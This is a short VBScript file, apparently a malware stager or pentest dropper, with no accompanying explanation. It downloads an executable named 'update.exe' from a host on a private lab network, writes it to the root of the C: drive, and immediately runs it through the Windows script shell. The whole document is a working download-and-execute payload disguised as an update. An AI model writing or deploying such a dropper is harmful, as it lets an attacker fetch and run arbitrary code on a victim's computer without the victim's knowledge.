fileurl ="http://192.168.56.103/update.exe"
filename ="update.exe"
dim shellobj 
set shellobj = wscript.createobject("wscript.shell")
strlink = fileurl
strsaveto = "C:\" &  filename
set objhttpdownload = createobject("msxml2.xmlhttp" )
objhttpdownload.open "get", strlink, false
objhttpdownload.send
set objfsodownload = createobject ("scripting.filesystemobject")
if  objfsodownload.fileexists (strsaveto) then
    objfsodownload.deletefile (strsaveto)
end if
 if objhttpdownload.status = 200 then
   dim  objstreamdownload
   set  objstreamdownload = createobject("adodb.stream")
   with objstreamdownload
        .type = 1 
        .open
        .write objhttpdownload.responsebody
        .savetofile strsaveto
        .close
   end with
   set objstreamdownload = nothing
end if
if objfsodownload.fileexists(strsaveto) then
   shellobj.run objfsodownload.getfile (strsaveto).shortpath
end if

